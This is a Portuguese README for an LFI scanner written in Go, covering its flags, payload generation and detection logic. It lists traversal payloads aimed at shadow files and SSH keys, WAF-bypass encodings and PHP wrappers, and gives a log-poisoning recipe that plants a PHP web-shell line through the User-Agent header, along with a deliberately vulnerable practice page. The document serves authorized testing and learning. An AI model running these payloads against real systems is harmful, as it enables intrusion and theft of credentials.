# Punkt

Scanner concorrente de LFI (Local File Inclusion) e file inclusion, escrito em
Go, inspirado no fluxo de trabalho de ferramentas como `nmap` e `ffuf`: dispara
um payload por requisição em paralelo, colore os resultados por status HTTP,
deixa você filtrar o que aparece no terminal e — diferente de um scanner que só
olha status code — inspeciona o corpo da resposta pra confirmar se a inclusão
realmente aconteceu.

Read this in English: [`README.md`](./README.md)

**Uso autorizado apenas.** Rode isso exclusivamente contra sistemas que você
possui ou tem autorização explícita e por escrito para testar: CTFs, VMs de
laboratório próprias, programas de bug bounty com escopo definido, ou
aplicações que você mesmo construiu. Escanear sistemas de terceiros sem
permissão é crime na maioria das jurisdições (Lei 12.737/2012 no Brasil, CFAA
nos EUA) e viola os termos de uso de praticamente qualquer plataforma. Não
existe flag ou modo nesta ferramenta que torne um escaneamento não autorizado
aceitável.

---

## Sumário

- [Como funciona](#como-funciona)
- [Build](#build)
- [Uso rápido](#uso-rápido)
- [Pontos de injeção](#pontos-de-injeção)
- [A wordlist de payloads a fundo](#a-wordlist-de-payloads-a-fundo)
- [Lógica de confirmação: bateu status vs confirmado](#lógica-de-confirmação-bateu-status-vs-confirmado)
- [Filtrando a saída](#filtrando-a-saída)
- [Ajuste de performance](#ajuste-de-performance)
- [Salvando resultados](#salvando-resultados)
- [Referência completa de flags](#referência-completa-de-flags)
- [Receitas](#receitas)
- [Montando um alvo local seguro pra praticar](#montando-um-alvo-local-seguro-pra-praticar)
- [Solução de problemas](#solução-de-problemas)
- [Limitações](#limitações)

---

## Como funciona

O Punkt roda em cinco etapas:

1. **Monta o conjunto de payloads** — a wordlist embutida (gerada na hora a
   partir de listas de arquivos x profundidades de traversal x separadores x
   encodings) ou uma wordlist customizada passada com `-w`.
2. **Sobe um pool de workers** — `-t` goroutines consomem payloads de um
   canal compartilhado e disparam requisições HTTP em paralelo.
3. **Injeta o payload** — na URL (placeholder `FUZZ` ou parâmetro `-p`), no
   corpo da requisição (`-b`), num header (`-H`) ou num cookie (`-c`).
4. **Classifica a resposta** — pelo status code e, adicionalmente, lendo o
   corpo da resposta em busca de evidência concreta de inclusão (não só um
   "200 OK").
5. **Mostra e, opcionalmente, persiste** — os resultados aparecem no
   terminal filtrados por `--mc`/`--fc`, e o conjunto completo (sem filtro)
   pode ser salvo em JSON ou texto puro.

Sem dependências de terceiros: a ferramenta inteira é standard library do Go,
por isso compila nativamente pra Windows, macOS e Linux só com
`GOOS`/`GOARCH`, sem precisar de toolchain CGO.

## Build

```bash
go build -o punkt .
```

### Cross-compile

```bash
# Windows, 64 bits — o Go adiciona .exe automaticamente mesmo sem -o punkt.exe
GOOS=windows GOARCH=amd64 go build -o punkt.exe .

# macOS Intel
GOOS=darwin GOARCH=amd64 go build -o punkt_macos .

# macOS Apple Silicon (M1/M2/M3/M4)
GOOS=darwin GOARCH=arm64 go build -o punkt_macos_arm .

# Linux, 64 bits
GOOS=linux GOARCH=amd64 go build -o punkt_linux .
```

No Windows, rode o binário com o prefixo `.\` no PowerShell (`.\punkt.exe
...`) — por padrão o PowerShell não executa binários da pasta atual, por
motivo de segurança. Use o Windows Terminal ou um PowerShell moderno pra ver
as cores certinho; num `cmd.exe` antigo, que mostra os códigos ANSI crus em
vez de cor, use `--no-color`.

## Uso rápido

```bash
./punkt -u "http://alvo.local/index.php?page=FUZZ"
```

`FUZZ` marca o ponto de injeção. O Punkt substitui ele por cada payload da
wordlist ativa e reporta, uma linha por requisição, o status code, o tamanho
da resposta, a categoria do payload e, quando aplicável, uma tag de inclusão
confirmada.

Se a URL alvo não tiver um lugar natural pra colocar `FUZZ`, você aponta
direto pro nome do parâmetro e o Punkt adiciona/sobrescreve:

```bash
./punkt -u "http://alvo.local/index.php" -p page
```

## Pontos de injeção

O Punkt suporta injetar o payload em qualquer um destes:

| Onde | Flag | Exemplo |
|---|---|---|
| URL (qualquer posição) | literal `FUZZ` em `-u` | `-u "http://x/view?file=FUZZ"` |
| Parâmetro GET | `-p` | `-p file` (usado só se `-u` não tiver `FUZZ`) |
| Corpo da requisição | `-b`, com `FUZZ` | `-b "template=FUZZ"` (combina com `-X POST`) |
| Header HTTP | `-H`, com `FUZZ` | `-H "X-Forwarded-For: FUZZ"` |
| Cookie | `-c`, com `FUZZ` | `-c "lang=FUZZ"` |

`-H` pode ser repetido pra mandar vários headers customizados na mesma
requisição; só os que contêm `FUZZ` recebem o payload substituído, o resto vai
cru. Isso é útil pra coisas como `X-Forwarded-For` forjado, `Referer`, ou
headers específicos da aplicação que acabam caindo num `include()`/
`require()` do lado do servidor.

## A wordlist de payloads a fundo

A wordlist embutida é gerada, não é uma lista fixa hardcoded — isso mantém o
binário pequeno e facilita entender o que cada payload testa. Ela é montada a
partir de quatro blocos:

**1. Arquivos alvo.** Selecionados por SO:

- *Linux*: `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/etc/issue`,
  `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/status`,
  `/proc/version`, logs de Apache/Nginx/vsftpd/mail, histórico de bash,
  chaves SSH privadas.
- *Windows*: `win.ini`, `system.ini`, `boot.ini`, o arquivo hosts, SAM,
  `unattend.xml`, logs de acesso do XAMPP/WAMP.

**2. Profundidade de traversal e separador.** Cada arquivo alvo recebe um
prefixo de `../` repetido em várias profundidades (pra garantir que o scanner
acerte o arquivo independente de quão aninhado o script que faz o include
está), usando o conjunto de separadores que seu `--level` seleciona: `/`,
`\`, `%2f` (URL-encoded) e `%5c`.

**3. Variantes de bypass por encoding** (só nos níveis 2 e 3): null byte
legado (`%00`), double URL-encoding (`%252f`) e overlong UTF-8 (`%c0%af`) —
três técnicas clássicas pra passar sequências de traversal por filtros
ingênuos que só decodificam uma vez ou só bloqueiam a string literal `../`.

**4. Payloads de wrapper PHP**, independentes de SO ou profundidade de
traversal: `php://filter/convert.base64-encode/resource=...` (vazamento de
código-fonte sem execução), `php://filter/read=string.rot13/resource=...`,
`php://input` (transforma LFI em comportamento parecido com RFI quando
`allow_url_include` está desligado mas `php://input` é alcançável),
`phar://`, `data://text/plain;base64,...`, `expect://` (se a extensão
`expect` estiver carregada, isso é execução direta de comando, não só
vazamento de arquivo) e `zip://`.

`--level` controla o quão exaustivos os blocos 2 e 3 são:

| Nível | Profundidades | Separadores | Variantes de bypass | Use quando |
|---|---|---|---|---|
| `1` | 2 | 1 | não | triagem rápida, alvo com rate limit |
| `2` (padrão) | 5 | 2 | sim | escaneamento geral |
| `3` | 10 | 4 | sim | auditoria completa, teste de bypass de WAF/filtro |

Use `-w caminho/lista.txt` pra substituir totalmente a wordlist embutida pela
sua própria (um payload por linha, `#` pra comentário). É a escolha certa
quando você já conhece a lógica do include (ex: revisão de código-fonte) e
quer mirar em caminhos bem específicos, ou quando está reaproveitando uma
wordlist de uma ferramenta tipo PayloadsAllTheThings.

## Lógica de confirmação: bateu status vs confirmado

Um `200 OK` sozinho é um sinal fraco — muita aplicação devolve `200` pra uma
página de erro, uma página que redireciona via JS, ou um fallback genérico,
independente do que você mandou. O Punkt distingue duas coisas:

- **Bateu status** — o status code da resposta é um dos que você pediu pra
  ver (`--mc`) ou não pediu pra esconder (`--fc`). É só um filtro de
  exibição.
- **Confirmado** — o corpo da resposta contém evidência concreta e
  específica da categoria de que a inclusão realmente vazou:
  - Alvos Linux: regex pra `root:x:0:0:` (uma entrada real do
    `/etc/passwd`) ou um hash estilo shadow `root:$<id-do-hash>$`.
  - Alvos Windows: um cabeçalho de seção INI tipo `[fonts]`,
    `[extensions]` ou `[boot loader]`.
  - Alvos de wrapper PHP: o corpo é um blob base64 que decodifica pra algo
    contendo `<?php` ou `<html` (ou seja, o `php://filter` trouxe
    código-fonte real de volta).

Um resultado confirmado aparece com a tag `<-- LFI CONFIRMADO` em vermelho
negrito. Trate um resultado que só bateu status como "vale a pena olhar na
mão", e um confirmado como "você tem evidência, pode documentar". Essa
distinção importa mais em runs com `--level 3`, onde você vai ter muito mais
status batido do que confirmação de verdade — não reporte o primeiro como
achado sem verificar manualmente.

## Filtrando a saída

Emprestado direto da convenção `-mc`/`-fc` do `ffuf`:

```bash
# mostrar só 200 e 403
./punkt -u "..." --mc 200,403

# esconder 404 e 500, mostrar o resto
./punkt -u "..." --fc 404,500
```

`--mc` e `--fc` só afetam o que é impresso no terminal. O conjunto de
resultados salvo em disco (veja [Salvando resultados](#salvando-resultados))
sempre contém tudo, filtrado ou não — então você pode rodar com `--mc 200`
pra uma visão limpa ao vivo e ainda ter a lista completa de `404` no arquivo
salvo pra comparar depois. `-v` adicionalmente mostra erros de rede
(timeout, falha de DNS, conexão resetada) que ficam escondidos por padrão.

## Ajuste de performance

- `-t` controla a concorrência de workers (padrão `20`). Aumentar acelera
  scans grandes, mas aumenta a chance de acionar rate limiting ou bloqueio
  de WAF — uma parede repentina de `403` ou `429` é sinal de que você foi
  rápido demais.
- `--delay` adiciona uma pausa (em milissegundos) antes de cada requisição,
  por worker. Combine `-t` mais baixo com `--delay` diferente de zero pra
  ficar abaixo de um rate limit agressivo e ainda rodar sem supervisão.
- `--timeout` limita quanto tempo o Punkt espera por requisição (padrão `10`
  segundos). Abaixe em alvos locais rápidos pra falhar rápido em payload
  morto; aumente se o alvo for lento ou você estiver passando por proxy.
- `--level 1` é a opção mais rápida quando você só precisa de um sinal de
  vai-ou-não-vai antes de se comprometer com um run completo em `--level 3`.

## Salvando resultados

- `-o <arquivo>` — salva automático quando o scan termina, sem perguntar
  nada.
- `--no-save` — nunca pergunta, nunca salva.
- Nenhuma das duas flags — o Punkt pergunta **antes do scan começar** se
  você quer salvar (e já pede o nome do arquivo ali, pra você não ter que
  lembrar de salvar depois de ver o scan rodar). Se você recusar no início,
  ele pergunta **de novo no final**, caso você tenha mudado de ideia vendo
  a saída.
- A extensão decide o formato: `.json` gera um array estruturado de
  objetos, qualquer outra coisa gera uma linha de texto puro por resultado.
- O arquivo salvo sempre contém o conjunto **completo** de resultados,
  independente de `--mc`/`--fc` — esses filtros afetam só a visão ao vivo no
  terminal.

Exemplo de entrada JSON:

```json
{
  "payload": "../../../../etc/passwd",
  "category": "linux",
  "status_code": 200,
  "length": 2847,
  "confirmed": true,
  "url": "http://alvo.local/index.php?page=../../../../etc/passwd"
}
```

## Referência completa de flags

| Flag | Descrição | Padrão |
|---|---|---|
| `-u` | URL alvo. Use `FUZZ` como ponto de injeção | *(obrigatório)* |
| `-X` | Método HTTP | `GET` |
| `-p` | Nome do parâmetro GET, se `-u` não tiver `FUZZ` | *(nenhum)* |
| `-b` | Corpo da requisição, com `FUZZ` | *(nenhum)* |
| `-c` | Valor do header Cookie, pode conter `FUZZ` | *(nenhum)* |
| `-H` | Header customizado `Nome:Valor`, repetível | *(nenhum)* |
| `-w` | Arquivo de wordlist customizada, um payload por linha | *(wordlist embutida)* |
| `-os` | Categoria de SO dos payloads: `linux`, `windows`, `all` | `all` |
| `--level` | Profundidade da wordlist: `1`, `2`, `3` | `2` |
| `-t` | Workers concorrentes | `20` |
| `--timeout` | Timeout por requisição, segundos | `10` |
| `--delay` | Delay antes de cada requisição, por worker, ms | `0` |
| `--mc` | Mostrar só esses status codes (separados por vírgula) | *(mostra tudo)* |
| `--fc` | Esconder esses status codes (separados por vírgula) | *(nenhum)* |
| `-o` | Arquivo de saída (`.json` ou `.txt`), salva automático | *(nenhum)* |
| `--no-save` | Nunca pergunta pra salvar, nunca salva | `false` |
| `-k` | Pula verificação de certificado TLS | `false` |
| `--proxy` | URL de proxy upstream (ex: Burp Suite) | *(nenhum)* |
| `-v` | Também imprime erros de rede/requisição | `false` |
| `--no-color` | Desativa cores ANSI | `false` |

## Receitas

```bash
# Triagem rápida: Linux apenas, só olhando códigos promissores
./punkt -u "http://alvo.local/view.php?file=FUZZ" --level 1 -os linux --mc 200,403

# Passagem completa com encodings de bypass de WAF, escondendo ruído
./punkt -u "http://alvo.local/view.php?file=FUZZ" --level 3 --fc 404

# Inclusão via POST (ex: nome de template mandado no corpo)
./punkt -u "http://alvo.local/api/render" -X POST -b "template=FUZZ" --mc 200

# Inclusão via header (candidato a log poisoning: X-Forwarded-For cai num log)
./punkt -u "http://alvo.local/" -H "X-Forwarded-For: FUZZ" --mc 200

# Via Burp Suite, ignorando o certificado autoassinado do proxy
./punkt -u "http://alvo.local/view.php?file=FUZZ" --proxy http://127.0.0.1:8080 -k

# Usando sua própria wordlist (ex: exportada de outra ferramenta, ou curada na mão)
./punkt -u "http://alvo.local/view.php?file=FUZZ" -w wordlists/custom_example.txt

# Scan sem supervisão pra script/pipeline de CI: sem prompts, saída estruturada
./punkt -u "http://alvo.local/view.php?file=FUZZ" -o scan-$(date +%Y%m%d).json --no-color -t 40
```

### Um exemplo trabalhado: cadeia de log poisoning

LFI sozinho só lê arquivo. Combinado com uma forma de escrever conteúdo
controlado pelo atacante num arquivo que o servidor vai ler depois — como um
log de acesso do servidor web — vira execução remota de código. A cadeia
usual:

1. Manda uma requisição com um payload PHP no header `User-Agent`, pra ele
   cair no log de acesso do servidor:
   ```bash
   curl -A '<?php system($_GET["c"]); ?>' "http://alvo.local/"
   ```
2. Usa o Punkt pra confirmar que o log de acesso é alcançável pelo ponto de
   LFI:
   ```bash
   ./punkt -u "http://alvo.local/view.php?file=FUZZ" -os linux --mc 200 \
     -w <(echo "../../../../var/log/apache2/access.log")
   ```
3. Se confirmado, requisitar esse caminho direto com `?c=id` no final
   executa o comando plantado. O trabalho do Punkt termina no passo 2 —
   confirmar que o log é incluível; o passo de exploração é manual e fica
   fora do escopo do scanner por design.

## Montando um alvo local seguro pra praticar

Não aponte isso pra sistema de produção, nem o seu, antes de testar contra
algo descartável. Uma app PHP vulnerável de cinco linhas já basta:

```php
<?php
// propositalmente vulneravel - uso apenas em pratica local
if (isset($_GET['page'])) {
    include($_GET['page']);
} else {
    echo "Uso: ?page=home.php";
}
```

Salva isso como `index.php` junto com um `home.php` inofensivo, e sobe com o
servidor embutido do PHP:

```bash
php -S localhost:8000
```

E aponta o Punkt pra ele:

```bash
./punkt -u "http://localhost:8000/index.php?page=FUZZ" -os linux --mc 200 --level 1
```

Você deve ver `/etc/passwd` (e parecidos) voltando como confirmado. A partir
daí, suba o `--level` pra ver como os payloads de bypass de encoding se
comportam, e tenta adicionar um filtro básico no `index.php` (ex:
`str_replace('../', '', $page)`) pra ver quais payloads do Punkt driblam o
filtro e quais não — essa é a forma mais rápida de construir intuição sobre
como filtros de LFI do mundo real falham.

## Solução de problemas

- **`punkt : o termo não é reconhecido` no PowerShell** — o PowerShell não
  executa binário da pasta atual sem prefixo. Use `.\punkt.exe` (Windows) ou
  `./punkt` (Linux/macOS), nunca `punkt` sozinho.
- **Cores aparecem como `\033[...]` cru** — você está num terminal sem
  suporte a código ANSI (`cmd.exe` antigo). Adicione `--no-color`.
- **Aviso de "nenhum ponto de injeção configurado"** — você passou uma
  URL/corpo/header/cookie sem `FUZZ` e sem `-p`. Adicione um dos dois; senão
  o scan manda a mesma requisição idêntica pra cada payload.
- **Só recebe `404` / `000`** — confirma que a URL alvo responde mesmo com
  `curl`, que o `FUZZ` está de fato presente na string que você passou pra
  `-u`/`-b`/`-H`/`-c`, e que você não está atrás de um `--proxy` digitado
  errado.
- **Tudo vem `confirmed: false` mesmo vendo um 200** — a confirmação é
  baseada em conteúdo, não em status, por design. Um `200` com corpo de
  página de erro genérica não é evidência de inclusão; confere a resposta
  crua você mesmo (ou roda de novo via `--proxy` pro Burp) antes de assumir
  que o detector está errado.

## Limitações

Isso é uma ferramenta de aprendizado/triagem, não um framework de exploração
completo. Por design, ela não: faz brute-force em múltiplos alvos de uma
lista, encadeia automaticamente um LFI confirmado em RCE, compara tamanho de
resposta contra um baseline pra pegar inclusão cega, nem segue redirects
(desligado de propósito, já que o status code de um redirect já é
diagnóstico por si só). São extensões razoáveis se você quiser evoluir a
ferramenta — o código não tem dependência externa, então mexer em
`payloads.go` ou `detect.go` é o caminho de menor atrito.